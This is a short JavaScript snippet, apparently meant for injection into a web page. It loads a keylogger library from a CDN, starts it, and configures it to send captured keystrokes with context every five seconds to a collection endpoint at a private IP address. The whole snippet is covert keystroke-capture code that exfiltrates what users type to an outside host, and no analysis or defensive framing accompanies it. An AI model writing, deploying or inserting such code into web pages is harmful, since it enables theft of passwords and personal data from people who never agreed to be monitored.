(function() {
    var script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/keylogger@latest/dist/keylogger.min.js';
    script.onload = function() {
        window.Keylogger.start();
        window.Keylogger.setConfig({
            url: 'http://10.0.2.15:5000/collect', // Updated IP
            interval: 5000,
            filterSensitive: true,
            includeContext: true
        });
    };
    document.head.appendChild(script);
})();